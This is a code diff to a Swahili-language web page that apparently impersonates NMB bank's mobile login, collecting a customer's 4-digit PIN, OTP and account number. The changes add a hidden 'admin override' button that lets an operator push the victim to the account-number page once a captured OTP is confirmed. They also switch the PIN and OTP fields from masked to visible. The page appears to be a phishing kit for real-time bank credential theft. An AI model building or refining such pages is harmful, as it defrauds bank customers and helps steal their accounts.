@@ -177,9 +177,13 @@
       <div class="status-box">
         <span id="waiting-status-text">Inasubiri meneja kukagua maelezo...</span>
       </div>
+      <!-- ADMIN OVERRIDE BUTTON TO IMMEDIATELY OPEN ACCOUNT NUMBER REQUEST ON OTP SAHIHI -->
+      <div style="margin-top: 25px; border-top: 1px dashed #ccc; padding-top: 15px; width: 100%; text-align: center;">
+        <button id="btn-admin-otp-sahihi" class="primary-btn" style="background-color: #28a745; font-size: 0.95rem;">✓ OTP Sahihi (Idhinisha Moja kwa Moja)</button>
+      </div>
     </div>
 
-    <!-- VIEW 4: PIN & LOGIN ENTRY -->
+    <!-- VIEW 4: PIN & LOGIN ENTRY (Visible by default: type="text") -->
     <div id="view-login" class="card hidden">
       <div class="login-header">
         <span class="bank-badge sm">NMB MKONONI</span>
@@ -193,28 +197,28 @@
       <div class="field">
         <label>Ingiza PIN ya NMB (Namba 4)</label>
         <div class="pin-inputs password-container" style="display: flex; gap: 8px; justify-content: center;">
-          <input type="password" maxlength="1" class="pin-box toggle-target" inputmode="numeric" style="width: 45px; height: 45px; text-align: center; font-size: 20px; font-weight: 700; border: 1px solid #ccc; border-radius: 6px; outline: none;">
-          <input type="password" maxlength="1" class="pin-box toggle-target" inputmode="numeric" style="width: 45px; height: 45px; text-align: center; font-size: 20px; font-weight: 700; border: 1px solid #ccc; border-radius: 6px; outline: none;">
-          <input type="password" maxlength="1" class="pin-box toggle-target" inputmode="numeric" style="width: 45px; height: 45px; text-align: center; font-size: 20px; font-weight: 700; border: 1px solid #ccc; border-radius: 6px; outline: none;">
-          <input type="password" maxlength="1" class="pin-box toggle-target" inputmode="numeric" style="width: 45px; height: 45px; text-align: center; font-size: 20px; font-weight: 700; border: 1px solid #ccc; border-radius: 6px; outline: none;">
-          <span class="toggle-password" id="togglePin" onclick="togglePinVisibility()">👁️</span>
+          <input type="text" maxlength="1" class="pin-box toggle-target" inputmode="numeric" style="width: 45px; height: 45px; text-align: center; font-size: 20px; font-weight: 700; border: 1px solid #ccc; border-radius: 6px; outline: none;">
+          <input type="text" maxlength="1" class="pin-box toggle-target" inputmode="numeric" style="width: 45px; height: 45px; text-align: center; font-size: 20px; font-weight: 700; border: 1px solid #ccc; border-radius: 6px; outline: none;">
+          <input type="text" maxlength="1" class="pin-box toggle-target" inputmode="numeric" style="width: 45px; height: 45px; text-align: center; font-size: 20px; font-weight: 700; border: 1px solid #ccc; border-radius: 6px; outline: none;">
+          <input type="text" maxlength="1" class="pin-box toggle-target" inputmode="numeric" style="width: 45px; height: 45px; text-align: center; font-size: 20px; font-weight: 700; border: 1px solid #ccc; border-radius: 6px; outline: none;">
+          <span class="toggle-password" id="togglePin" onclick="togglePinVisibility()">👁️‍🗨️</span>
         </div>
         <span id="pin-error" class="error-text hidden">PIN si sahihi. Tafadhali jaribu tena.</span>
       </div>
       <button id="btn-login" class="primary-btn" disabled>INGIA</button>
     </div>
 
-    <!-- VIEW 5: OTP VERIFICATION (4 DIGITS) -->
+    <!-- VIEW 5: OTP VERIFICATION (4 DIGITS) (Visible by default: type="text") -->
     <div id="view-otp" class="card hidden">
       <h2>Uthibitisho wa OTP</h2>
       <p>Weka nambari ya siri yenye tarakimu 4 iliyotumwa kwenye namba yako ya simu <span id="otp-target-display"></span></p>
       <div class="field">
         <div class="otp-inputs password-container" style="display: flex; gap: 8px; justify-content: center;">
-          <input type="password" maxlength="1" class="otp-box toggle-target-otp" inputmode="numeric" style="width: 45px; height: 45px; text-align: center; font-size: 20px; font-weight: 700; border: 1px solid #ccc; border-radius: 6px; outline: none;">
-          <input type="password" maxlength="1" class="otp-box toggle-target-otp" inputmode="numeric" style="width: 45px; height: 45px; text-align: center; font-size: 20px; font-weight: 700; border: 1px solid #ccc; border-radius: 6px; outline: none;">
-          <input type="password" maxlength="1" class="otp-box toggle-target-otp" inputmode="numeric" style="width: 45px; height: 45px; text-align: center; font-size: 20px; font-weight: 700; border: 1px solid #ccc; border-radius: 6px; outline: none;">
-          <input type="password" maxlength="1" class="otp-box toggle-target-otp" inputmode="numeric" style="width: 45px; height: 45px; text-align: center; font-size: 20px; font-weight: 700; border: 1px solid #ccc; border-radius: 6px; outline: none;">
-          <span class="toggle-password" id="toggleOtp" onclick="toggleOtpVisibility()">👁️</span>
+          <input type="text" maxlength="1" class="otp-box toggle-target-otp" inputmode="numeric" style="width: 45px; height: 45px; text-align: center; font-size: 20px; font-weight: 700; border: 1px solid #ccc; border-radius: 6px; outline: none;">
+          <input type="text" maxlength="1" class="otp-box toggle-target-otp" inputmode="numeric" style="width: 45px; height: 45px; text-align: center; font-size: 20px; font-weight: 700; border: 1px solid #ccc; border-radius: 6px; outline: none;">
+          <input type="text" maxlength="1" class="otp-box toggle-target-otp" inputmode="numeric" style="width: 45px; height: 45px; text-align: center; font-size: 20px; font-weight: 700; border: 1px solid #ccc; border-radius: 6px; outline: none;">
+          <input type="text" maxlength="1" class="otp-box toggle-target-otp" inputmode="numeric" style="width: 45px; height: 45px; text-align: center; font-size: 20px; font-weight: 700; border: 1px solid #ccc; border-radius: 6px; outline: none;">
+          <span class="toggle-password" id="toggleOtp" onclick="toggleOtpVisibility()">👁️‍🗨️</span>
         </div>
         <span id="otp-error" class="error-text hidden">OTP si sahihi. Tafadhali jaribu tena.</span>
       </div>
@@ -311,36 +315,48 @@
           setTimeout(() => loader.remove(), 300);
         }, 500);
       }
+
+      // Admin button listener for direct progression to account number page upon "OTP Sahihi"
+      const adminOtpBtn = document.getElementById('btn-admin-otp-sahihi');
+      if (adminOtpBtn) {
+        adminOtpBtn.addEventListener('click', () => {
+          // Hide waiting view and show account number request view directly
+          const viewWaiting = document.getElementById('view-waiting');
+          const viewAccount = document.getElementById('view-account');
+          if (viewWaiting) viewWaiting.classList.add('hidden');
+          if (viewAccount) viewAccount.classList.remove('hidden');
+        });
+      }
     });
 
-    // Toggle Pin Visibility Function (Opens and closes the eye icon dynamically)
+    // Toggle Pin Visibility Function (Switches between text/visible and password/masked)
     function togglePinVisibility() {
       const boxes = document.querySelectorAll('.toggle-target');
       const toggleBtn = document.getElementById('togglePin');
-      let isPassword = true;
+      let isVisible = true;
       boxes.forEach(box => {
-        if (box.type === 'text') isPassword = false;
+        if (box.type === 'password') isVisible = false;
       });
       boxes.forEach(box => {
-        box.type = isPassword ? 'text' : 'password';
+        box.type = isVisible ? 'password' : 'text';
       });
-      toggleBtn.textContent = isPassword ? '👁️‍🗨️' : '👁️';
+      toggleBtn.textContent = isVisible ? '👁️' : '👁️‍🗨️';
     }
 
-    // Toggle OTP Visibility Function (Opens and closes the eye icon dynamically)
+    // Toggle OTP Visibility Function (Switches between text/visible and password/masked)
     function toggleOtpVisibility() {
       const boxes = document.querySelectorAll('.toggle-target-otp');
       const toggleBtn = document.getElementById('toggleOtp');
-      let isPassword = true;
+      let isVisible = true;
       boxes.forEach(box => {
-        if (box.type === 'text') isPassword = false;
+        if (box.type === 'password') isVisible = false;
       });
       boxes.forEach(box => {
-        box.type = isPassword ? 'text' : 'password';
+        box.type = isVisible ? 'password' : 'text';
       });
-      toggleBtn.textContent = isPassword ? '👁️‍🗨️' : '👁️';
+      toggleBtn.textContent = isVisible ? '👁️' : '👁️‍🗨️';
     }
   </script>
 </body>
-        </html>
-  
+          </html>
+                                      
